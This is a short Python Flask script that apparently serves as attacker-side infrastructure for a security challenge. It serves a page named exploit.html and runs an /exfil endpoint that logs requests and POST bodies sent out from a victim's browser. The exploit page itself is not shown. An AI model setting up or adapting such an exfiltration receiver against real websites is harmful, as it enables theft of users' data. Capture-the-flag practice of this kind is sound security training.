#!/usr/bin/env python3
from flask import Flask, Response, request

"""
Host at 
http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg.reg.ress.me:1234/
"""

app = Flask(__name__, static_folder='.')

@app.route('/')
def exploit():
  return app.send_static_file('exploit.html')

@app.route('/exfil', methods=['GET', 'POST'])
def exfil():
  print(request)
  if request.method == 'POST':
    print(request.data)
  return ""

if __name__ == '__main__':  # pragma: no cover
    app.run(port=3000)
